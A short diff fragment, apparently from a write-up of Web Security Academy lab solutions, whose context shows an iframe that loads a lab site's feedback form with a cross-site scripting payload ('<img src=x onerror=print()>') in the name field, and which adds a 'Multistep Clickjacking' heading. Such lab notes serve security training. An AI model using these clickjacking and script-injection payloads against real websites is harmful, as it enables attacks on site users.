@@ -152,3 +152,4 @@ load the name parameter with the xss payload and other parameters also and make 
 <iframe src="https://0a44005604fb15528036670c008a00a3.web-security-academy.net/feedback?name=<img src=x onerror=print()> &email=od@gmail.com&subject=hello&message=zxcvb" ></iframe>
 ```
 
+## Multistep Clickjacking
